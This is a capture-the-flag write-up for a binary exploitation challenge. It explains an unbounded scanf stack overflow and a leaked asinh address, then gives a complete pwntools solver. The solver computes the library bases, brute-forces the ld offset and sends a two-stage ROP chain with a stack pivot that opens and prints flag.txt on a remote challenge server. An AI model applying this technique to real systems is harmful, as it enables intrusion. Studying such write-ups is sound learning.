![[Pasted image 20260406184504.png]]
## FILE & CHECKSEC

![[Pasted image 20260408124717.png]]

## Chall.c

``` c
#include <stdio.h>
#include <math.h>
#include <stdint.h>

void setup() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

int main() {
    setup();

    double glory = asinh((double)(uintptr_t)&asinh);
    printf("Blessing: %.67lf\n", glory);

    char performai[67];
    printf("Last Piece: ");
    scanf("%s", performai);
    printf("\nMay you find Blessing and Glory in this Last Piece.\n");

    return 0;
}
```

>[!note]- Explanation
>
>```c
>double glory = asinh((double)(uintptr_t)&asinh);
>printf("Blessing: %.67lf\n", glory);
>```
>
>This part takes the runtime address of `asinh`, converts it into a `double`, then passes it into the math function `asinh()`.  
>The result is stored in `glory` and printed as `Blessing`.
>
>```c
>char performai[67];
>scanf("%s", performai);
>```
>
>The vulnerability is the use of `scanf("%s", ...)` without a size limit.  
>Since `%s` keeps reading until whitespace, we can send input longer than 67 bytes and overflow the buffer.

## `asinh` offset in `libm`

>[!note]- Explanation
>
>The program leaks a value related to the runtime address of `asinh`, so the first thing we need is the static offset of `asinh` inside `libm.so.6`.
>
>We can get that with:
>![[Pasted image 20260408130345.png]]
>
>So once we recover the real runtime address of `asinh`, we can calculate:
>
>```python
>libm_base = asinh_addr - 0x73680
>```
>
>This is how we turn the `Blessing` leak into the base address of `libm`.

## Offset to RIP

>[!note]- Explanation
>
>Next, we need the overflow offset so we know how many bytes are required before controlling the return address.
>
>From the disassembly, the input buffer is located at:
>
>![[Pasted image 20260408130247.png]]
>
>This means the buffer starts at `rbp-0x50`, so the distance from the start of the buffer to saved RIP is:
>
>```text
>0x50 + 0x8 = 0x58
>```
>
>which is:
>
>```text
>88 bytes
>```

## Strategy Overview

>[!note]- Main idea
>
>The final goal is to build an **ORW chain**:
>
>- `open("flag.txt", 0)`
>- `read(...)`
>- `write(1, ...)`
>
>That is enough to open the flag file, read its contents, and print it back to us.
>
>However, we cannot place the full ORW chain directly on the initial stack overflow, because the available space is too limited.  
>So instead of executing the full payload there, we first move execution into a larger writable memory area.
>
>In the solver, that writable area is taken from:
>
>```python
>rw = libm + RW_OFF
>```
>
>This points to a writable region inside `libm`, specifically `.bss`, which is a much better place to store a bigger second-stage payload.
>
>So the exploit uses a **two-stage approach**:
>
>- **Stage 1**: send a short ROP chain that reads more data into `.bss`, then pivots the stack there
>- **Stage 2**: place the full ORW chain inside that `.bss` area
>
>After the pivot, execution continues from `.bss`, and from there we can run the full ORW chain to retrieve the flag.
>
>Another important detail is that not all needed gadgets come from `libm`.  
>Some crucial ones, like `pop rax` and `syscall`, come from `ld-linux`, so besides recovering the base of `libm`, we also need the correct `ld` base in order for the chain to work.

## Solve.py

``` python
#!/usr/bin/env python3
from math import sinh
from pwn import *

context.binary = elf = ELF("./chall_patched")
context.arch = "amd64"
context.log_level = "error"

OFFSET = 88
BAD_BYTES = b"\x09\x0a\x0b\x0c\x0d\x20"

ASINH_OFF = 0x73680
RW_OFF = 0x125000

POP_RDI = 0x45cf5
POP_RSI = 0x5aa6b
POP_RDX = 0x7df2d
POP_RSP = 0x62551

POP_RAX = 0x17433
SYSCALL = 0x292d5

HOST = '103.185.52.198'
PORT = 31350

def start():
    return remote(HOST, PORT)

def parse_libm_base(io):
    io.recvuntil(b"Blessing: ")
    line = io.recvline().decode().strip()
    blessing = float(line)
    asinh_addr = int(round(sinh(blessing)))
    return (asinh_addr - ASINH_OFF) 

def build_stage1(libm, ld):
    rw = libm + RW_OFF
    chain = flat(
        b"A" * OFFSET,
        libm + POP_RDI, 0,
        libm + POP_RSI, rw,
        libm + POP_RDX, 0x400,
        ld + POP_RAX, 0,
        ld + SYSCALL,
        libm + POP_RSP, rw,
    )
    return chain, rw

def has_bad_bytes(data):
    return any(byte in BAD_BYTES for byte in data)

def build_stage2(libm, ld, rw, fd):
    filename = rw + 0x200
    outbuf = rw + 0x300
    chain = flat(
        libm + POP_RDI, filename,
        libm + POP_RSI, 0,
        libm + POP_RDX, 0,
        ld + POP_RAX, 2,
        ld + SYSCALL,
        
        libm + POP_RDI, fd,
        libm + POP_RSI, outbuf,
        libm + POP_RDX, 0x100,
        ld + POP_RAX, 0,
        ld + SYSCALL,
        
        libm + POP_RDI, 1,
        libm + POP_RSI, outbuf,
        libm + POP_RDX, 0x100,
        ld + POP_RAX, 1,
        ld + SYSCALL,
    )
    stage2 = chain.ljust(0x200, b"\x00") + b"flag.txt\x00"
    return stage2

def main():
    for test_fd in range(3, 5):
        for delta_guess in range(0x100000, 0x200001, 0x1000):
            print(f"[*] Trying FD: {test_fd} | DELTA: {hex(delta_guess)}", end='\r')
            
            while True:
                try:
                    io = start()
                    libm = parse_libm_base(io)
                    ld_guess = libm + delta_guess
                    stage1, rw = build_stage1(libm, ld_guess)
                    
                    if not has_bad_bytes(stage1):
                        break
                    io.close()
                except Exception:
                    continue
                    
            stage2 = build_stage2(libm, ld_guess, rw, test_fd)
            
            try:
                io.recvuntil(b"Last Piece: ")
                io.send(stage1 + b"\n")
                sleep(0.15)
                io.send(stage2)
                io.shutdown("send")
                
                data = io.recvall(timeout=1.5)
                if b"PETIR{" in data:
                    print(f"\n[!] REMOTE PWNED! FD: {test_fd} | DELTA: {hex(delta_guess)}")
                    print(f"[!] FLAG: {data.decode(errors='ignore').strip()}")
                    return
                io.close()
            except Exception:
                io.close()
    
    print("\n[-] All attempts failed. Check offsets or server status.")

if __name__ == "__main__":
    main()
```

>[!note]- Gadgets used
>
>The exploit uses several standard ROP gadgets:
>
>```python
>POP_RDI = 0x45cf5
>POP_RSI = 0x5aa6b
>POP_RDX = 0x7df2d
>POP_RSP = 0x62551
>
>POP_RAX = 0x17433
>SYSCALL = 0x292d5
>```
>
>Their roles are simple:
>
>- `pop rdi`, `pop rsi`, `pop rdx` set syscall arguments
>- `pop rax` sets the syscall number
>- `syscall` executes the syscall
>- `pop rsp` is used for the stack pivot
>
>I did not include the full gadget hunting process here, but these were obtained with the usual tools such as `ROPgadget`.

>[!note]- Reversing the `asinh` leak
>
>The program prints a value derived from:
>
>```c
>double glory = asinh((double)(uintptr_t)&asinh);
>printf("Blessing: %.67lf\n", glory);
>```
>
>So the printed value is not the raw address of `asinh`, but the result after applying `asinh()` to it.
>
>In the solver, we reverse it with `sinh()`:
>
>```python
>def parse_libm_base(io):
>    io.recvuntil(b"Blessing: ")
>    line = io.recvline().decode().strip()
>    blessing = float(line)
>    asinh_addr = int(round(sinh(blessing)))
>    return (asinh_addr - ASINH_OFF)
>```
>
>Since `sinh(asinh(x)) = x`, this gives back the real runtime address of `asinh`.  
>After that, we subtract its known static offset:
>
>```python
>ASINH_OFF = 0x73680
>```
>
>and recover the base address of `libm`.

>[!note]- Stage 1 and Stage 2 payloads
>
>The exploit uses a two-stage payload because the initial overflow is too small to hold the full ORW chain.
>
>Stage 1 is:
>
>```python
>def build_stage1(libm, ld):
>    rw = libm + RW_OFF
>    chain = flat(
>        b"A" * OFFSET,
>        libm + POP_RDI, 0,
>        libm + POP_RSI, rw,
>        libm + POP_RDX, 0x400,
>        ld + POP_RAX, 0,
>        ld + SYSCALL,
>        libm + POP_RSP, rw,
>    )
>    return chain, rw
>```
>
>The goal of Stage 1 is:
>
>- call `read(0, rw, 0x400)`
>- store a bigger payload into writable memory
>- pivot `rsp` into that memory with `pop rsp`
>
>So Stage 1 is just a loader for the real payload.
>
>Stage 2 is the actual ORW chain:
>
>```python
>def build_stage2(libm, ld, rw, fd):
>    filename = rw + 0x200
>    outbuf = rw + 0x300
>    chain = flat(
>        libm + POP_RDI, filename,
>        libm + POP_RSI, 0,
>        libm + POP_RDX, 0,
>        ld + POP_RAX, 2,
>        ld + SYSCALL,
>        
>        libm + POP_RDI, fd,
>        libm + POP_RSI, outbuf,
>        libm + POP_RDX, 0x100,
>        ld + POP_RAX, 0,
>        ld + SYSCALL,
>        
>        libm + POP_RDI, 1,
>        libm + POP_RSI, outbuf,
>        libm + POP_RDX, 0x100,
>        ld + POP_RAX, 1,
>        ld + SYSCALL,
>    )
>    stage2 = chain.ljust(0x200, b"\x00") + b"flag.txt\x00"
>    return stage2
>```
>
>Its flow is:
>
>1. `open("flag.txt", 0)`
>2. `read(fd, outbuf, 0x100)`
>3. `write(1, outbuf, 0x100)`
>
>After Stage 1 pivots execution into `.bss`, Stage 2 runs from there and prints the flag.

>[!note]- Checking bad bytes
>
>The solver also checks for bad bytes before sending Stage 1:
>
>```python
>BAD_BYTES = b"\x09\x0a\x0b\x0c\x0d\x20"
>
>def has_bad_bytes(data):
>    return any(byte in BAD_BYTES for byte in data)
>```
>
>and later:
>
>```python
>if not has_bad_bytes(stage1):
>    break
>```
>
>This is important because the input is read with `scanf("%s", ...)`.  
>`%s` stops when it sees whitespace-like characters, so bytes such as space, tab, or newline can break the payload before the whole chain is read.
>
>Because of that, even if a ROP chain is logically correct, it still cannot be used if one of its bytes contains a bad character.  
>So the exploit keeps retrying until it gets a Stage 1 payload whose bytes are safe to pass through `scanf("%s")`.
>

>[!note]- Bruteforcing the `ld` delta
>
>Not all gadgets come from the same library:
>
>- `pop rdi`, `pop rsi`, `pop rdx`, `pop rsp` come from `libm`
>- `pop rax` and `syscall` come from `ld`
>
>So recovering only the base of `libm` is not enough.  
>We also need the base of `ld`, because some important gadgets are taken from there.
>
>That is why the solver bruteforces a relative delta:
>
>```python
>for delta_guess in range(0x100000, 0x200001, 0x1000):
>    ld_guess = libm + delta_guess
>```
>
>The idea is simple: we assume `ld` is mapped somewhere close to `libm`, then try page-aligned guesses until the gadget addresses become correct.
>
>The chosen range is also reasonable:
>
>- `0x100000` = 1 MB
>- `0x200000` = 2 MB
>
>So we are basically guessing that the distance between `libm` and `ld` is around **1 to 2 MB**.
>
>This is a practical search window:
>
>- going below `0x100000` would mean the two libraries are placed less than 1 MB apart, which is less likely for separate shared mappings
>- going much higher would just waste attempts and make the bruteforce slower
>
>The step size is:
>
>```python
>0x1000
>```
>
>which is one memory page, so each guess stays page-aligned like normal library mappings.
>
>This can differ between local and remote because the runtime memory layout is environment-dependent.  
>Even with the same challenge files, the loader may place shared libraries at slightly different relative positions because of ASLR and mapping differences.
>
>So a delta that works locally is not guaranteed to work remotely, which is why the exploit bruteforces a reasonable page-aligned range instead of assuming both layouts are identical.

## FLAG

![[Pasted image 20260408131215.png]]
